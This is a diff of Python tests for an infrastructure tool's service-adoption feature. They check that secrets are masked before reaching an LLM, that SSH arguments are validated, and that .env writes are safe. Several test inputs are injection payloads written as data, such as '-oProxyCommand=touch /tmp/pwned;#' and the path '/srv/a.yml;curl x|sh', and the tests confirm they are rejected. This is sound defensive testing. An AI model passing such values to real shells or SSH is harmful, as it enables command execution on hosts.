@@ -135,6 +135,88 @@ class TestAdoptionGenerator:
         assert "TOKEN: <replace-with-credential>" in result.reasoning
 
 
+class RecordingReasoner:
+    """Captures exactly what would be sent to the LLM provider."""
+
+    def __init__(self, sanitized_compose: str, keys=("TOKEN",)):
+        self.sent: dict = {}
+        self._result = {
+            **VALID,
+            "sanitized_compose": sanitized_compose,
+            "detected_secret_keys": list(keys),
+        }
+
+    def detect_hardcoded_secrets(self, **kwargs):
+        self.sent = kwargs
+        return self._result
+
+
+_TOKEN = "abcdefghijklmnopqrstuvwxyz0123456789"
+_LEGACY = (
+    "services:\n  legacy:\n    image: legacy:1.0\n    environment:\n"
+    f"      TOKEN: {_TOKEN}\n      TZ: America/New_York\n      LOG_LEVEL: info\n"
+)
+_LIVE_ENV = {"TOKEN": _TOKEN, "TZ": "America/New_York", "LOG_LEVEL": "info"}
+
+
+class TestAdoptionValueMasking:
+    """Live secret values must never reach the LLM provider."""
+
+    def test_live_values_never_reach_the_reasoner(self):
+        reasoner = RecordingReasoner(_LEGACY)
+        AdoptionGenerator(reasoner, threshold=0.8).generate(
+            compose_content=_LEGACY, container_env=_LIVE_ENV, container_labels={}
+        )
+        sent = str(reasoner.sent)
+        assert _TOKEN not in sent
+        assert "America/New_York" not in sent
+        assert "TOKEN: <value-of:TOKEN>" in reasoner.sent["compose_content"]
+        assert "LOG_LEVEL: info" in reasoner.sent["compose_content"]  # too short to mask
+        assert reasoner.sent["container_env"] == {
+            "TOKEN": "<value-of:TOKEN>",
+            "TZ": "<value-of:TZ>",
+            "LOG_LEVEL": "<value-of:LOG_LEVEL>",
+        }
+
+    def test_kept_placeholders_are_restored(self):
+        reply = (
+            "services:\n  legacy:\n    image: legacy:1.0\n    environment:\n"
+            "      TOKEN: ${TOKEN}\n      TZ: <value-of:TZ>\n      LOG_LEVEL: info\n"
+        )
+        result = AdoptionGenerator(RecordingReasoner(reply), threshold=0.8).generate(
+            compose_content=_LEGACY, container_env=_LIVE_ENV, container_labels={}
+        )
+        assert result.ok is True
+        assert "TZ: America/New_York" in result.sanitized_compose
+        assert "TOKEN: ${TOKEN}" in result.sanitized_compose
+
+    def test_an_altered_placeholder_is_rejected(self):
+        reply = "services:\n  legacy:\n    environment:\n      TZ: <value-of:TIMEZONE>\n"
+        result = AdoptionGenerator(RecordingReasoner(reply), threshold=0.8).generate(
+            compose_content=_LEGACY, container_env=_LIVE_ENV, container_labels={}
+        )
+        assert result.ok is False
+        assert "placeholder" in result.rejection_reason
+
+    def test_a_secret_the_model_kept_is_still_scrubbed(self):
+        reply = "services:\n  legacy:\n    environment:\n      TOKEN: <value-of:TOKEN>\n"
+        result = AdoptionGenerator(RecordingReasoner(reply, keys=()), threshold=0.8).generate(
+            compose_content=_LEGACY, container_env=_LIVE_ENV, container_labels={}
+        )
+        assert _TOKEN not in result.sanitized_compose
+        assert "TOKEN: <replace-with-credential>" in result.sanitized_compose
+
+    def test_overlapping_values_round_trip_exactly(self):
+        compose = "x: password1234\ny: password123\n"
+        env = {"A": "password123", "B": "password1234"}
+        reasoner = RecordingReasoner("x: <value-of:B>\ny: <value-of:A>\n", keys=())
+        result = AdoptionGenerator(reasoner, threshold=0.8).generate(
+            compose_content=compose, container_env=env, container_labels={}
+        )
+        assert reasoner.sent["compose_content"] == "x: <value-of:B>\ny: <value-of:A>\n"
+        assert result.sanitized_compose == compose
+
+
 # ---------------------------------------------------------------------------
 # SSH helpers
 # ---------------------------------------------------------------------------
@@ -187,6 +269,49 @@ class TestSSHHelpers:
                 key_path="/key", user="root", host="1.2.3.4", path="/srv/.env"
             )
         assert result is None
+
+    def test_ssh_base_rejects_option_shaped_user(self):
+        """`user@host` sits where ssh still parses options, so a user of
+        `-oProxyCommand=...` would run a command on the control-plane node."""
+        from registry_mcp.adoption import ssh as remote
+
+        for user in ("-oProxyCommand=touch /tmp/pwned;#", "root@evil", "a b", ""):
+            try:
+                remote._ssh_base("/key", user, "10.0.0.5")
+                raised = False
+            except SSHError:
+                raised = True
+            assert raised, user
+
+    def test_ssh_base_rejects_option_shaped_host(self):
+        from registry_mcp.adoption import ssh as remote
+
+        for host in ("-oProxyCommand=x", "host name", ""):
+            try:
+                remote._ssh_base("/key", "root", host)
+                raised = False
+            except SSHError:
+                raised = True
+            assert raised, host
+
+    def test_ssh_base_terminates_options_before_destination(self):
+        from registry_mcp.adoption import ssh as remote
+
+        argv = remote._ssh_base("/key", "root", "10.0.0.5")
+        assert argv[-2:] == ["--", "root@10.0.0.5"]
+
+    async def test_remote_path_is_quoted_for_the_remote_shell(self):
+        """ssh hands trailing args to the remote login shell as one string, so a
+        compose path taken from a container label must arrive as one quoted word."""
+        from registry_mcp.adoption import ssh as remote
+
+        run = AsyncMock(return_value=(0, "services: {}\n", ""))
+        with patch.object(remote, "_run", new=run):
+            await remote.read_remote_file(
+                key_path="/key", user="root", host="10.0.0.5", path="/srv/a.yml;curl x|sh"
+            )
+        argv = run.await_args.args[0]
+        assert argv[-1] == "cat -- '/srv/a.yml;curl x|sh'"
 
 
 # ---------------------------------------------------------------------------
@@ -463,6 +588,57 @@ class TestProposalAdoptService:
         assert "error" in result
         assert "docker inspect failed" in result["error"]
 
+    async def test_secret_detection_runs_off_the_event_loop(self, store, hardware_store):
+        from conftest import BlockingCall
+
+        node = _node(hardware_store)
+        service = _docker_service(store)
+        hardware_store.link_service(service.id, node.id)
+        reasoner = FakeReasoner()
+        reasoner.detect_hardcoded_secrets = BlockingCall(VALID)
+        tools, _, _ = _setup(
+            store, hardware_store, generator=AdoptionGenerator(reasoner, threshold=0.8)
+        )
+        inspect_data = {
+            "Config": {
+                "Env": ["TOKEN=supersecretvalue"],
+                "Labels": {
+                    "com.docker.compose.project.config_files": "/srv/legacy/docker-compose.yml",
+                },
+            }
+        }
+        with (
+            patch(
+                "registry_mcp.tools.adoption.remote.inspect_container",
+                new=AsyncMock(return_value=inspect_data),
+            ),
+            patch(
+                "registry_mcp.tools.adoption.remote.read_remote_file",
+                new=AsyncMock(return_value="services:\n  legacy:\n    image: legacy:1.0\n"),
+            ),
+        ):
+            result = await reasoner.detect_hardcoded_secrets.assert_off_loop(
+                tools["proposal_adopt_service"](service.id)
+            )
+        assert "draft_id" in result
+
+    async def test_option_shaped_ssh_user_never_reaches_a_subprocess(self, store, hardware_store):
+        node = _node(hardware_store)
+        service = _docker_service(store)
+        hardware_store.link_service(service.id, node.id)
+        tools, _, _ = _setup(store, hardware_store)
+
+        from registry_mcp.adoption import ssh as remote
+
+        run = AsyncMock(return_value=(0, "[]", ""))
+        with patch.object(remote, "_run", new=run):
+            result = await tools["proposal_adopt_service"](
+                service.id, ssh_user="-oProxyCommand=touch /tmp/pwned;#"
+            )
+        assert "error" in result
+        assert "unsafe SSH user" in result["error"]
+        run.assert_not_awaited()
+
     async def test_no_compose_labels_returns_error(self, store, hardware_store):
         node = _node(hardware_store)
         service = _docker_service(store)
@@ -565,6 +741,44 @@ class TestProposalAdoptServiceFinalize:
         assert commit_paths.await_count == 1
         assert git.commits and git.opened
         assert adoption_store.get(drafted["draft_id"]).status == AdoptionDraftStatus.finalized
+
+    async def test_finalize_refuses_a_live_value_with_a_line_break(self, store, hardware_store):
+        """A captured value with a line break would write extra `.env` lines."""
+        tools, _, _ = _setup(store, hardware_store, git=FakeGit())
+        node = _node(hardware_store)
+        service = _docker_service(store)
+        hardware_store.link_service(service.id, node.id)
+        inspect_data = {
+            "Config": {
+                "Env": ["TOKEN=live\nINJECTED=1"],
+                "Labels": {
+                    "com.docker.compose.project.config_files": "/srv/legacy/docker-compose.yml",
+                },
+            }
+        }
+        with (
+            patch(
+                "registry_mcp.tools.adoption.remote.inspect_container",
+                new=AsyncMock(return_value=inspect_data),
+            ),
+            patch(
+                "registry_mcp.tools.adoption.remote.read_remote_file",
+                new=AsyncMock(return_value="services: {}\n"),
+            ),
+        ):
+            drafted = await tools["proposal_adopt_service"](service.id)
+
+        with (
+            patch("registry_mcp.gitcrypt.repo_path", return_value=Path("/repo")),
+            patch("registry_mcp.gitcrypt.key_bytes", return_value=b"key"),
+            patch("registry_mcp.gitcrypt.git_checkout_branch", new=AsyncMock()) as checkout,
+            patch("pathlib.Path.write_text") as write_text,
+        ):
+            result = await tools["proposal_adopt_service_finalize"](drafted["draft_id"], "keep")
+
+        assert "line break" in result["error"]
+        checkout.assert_not_awaited()
+        write_text.assert_not_called()
 
     async def test_finalize_rotate_generates_new_value(self, store, hardware_store):
         git = FakeGit()
